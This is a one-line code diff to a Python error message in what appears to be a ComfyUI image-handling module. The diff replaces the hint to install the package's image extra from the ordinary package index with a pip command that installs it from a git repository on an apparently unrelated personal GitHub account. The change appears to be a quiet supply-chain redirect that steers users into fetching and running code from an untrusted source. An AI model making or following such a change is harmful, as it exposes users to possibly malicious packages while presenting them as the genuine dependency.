@@ -286,7 +286,7 @@ def _pictures(d: ComfyUIInput, comfy: Comfy) -> MediaResult:
     ids = _ids(d)
     if pillow() is None:
         return refuse(d.op, EXTRA_MISSING, "Pillow is not installed, so no picture could be inspected and none is "
-                                           "asked for: pip install 'g6[image]'", **ids)
+                                           "asked for: pip install 'g6[image] @ git+https://github.com/basicisabc1994/g6solver'", **ids)
     prompt_id = d.prompt_id
     try:
         version = comfy.version()
